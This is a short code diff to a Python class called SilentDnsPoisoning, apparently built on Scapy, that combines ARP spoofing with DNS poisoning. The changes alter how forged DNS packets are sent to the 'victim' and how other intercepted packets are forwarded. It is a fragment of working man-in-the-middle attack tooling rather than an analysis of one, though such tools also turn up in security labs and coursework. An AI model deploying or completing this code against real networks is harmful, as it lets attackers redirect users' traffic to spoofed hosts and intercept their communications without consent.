@@ -49,7 +49,7 @@ class SilentDnsPoisoning:
                                         # combine into complete packet
                                         poisonPacket = fakeIP / fakeUDP / fakeDNS
                                         # send the poison packet to the victim
-                                        sendp(poisonPacket, verbose=0, iface=interface)
+                                        send(poisonPacket, verbose=0, iface=interface)
                                         print("Fake packet sent")
                                 if linkPresent == False:
                                     # No link match -> resend the DNS request to its true receiver
@@ -72,7 +72,10 @@ class SilentDnsPoisoning:
                             found = True
                             break
                     if found:
-                        sendp(pkt, iface=interface)
+                        if pkt.haslayer(DNS):
+                            send(pkt, iface=interface)
+                        else:
+                            sendp(pkt, iface=interface)
         arpSpoofing = ArpSpoofing(self.interface)
         try:
             print("before thread")
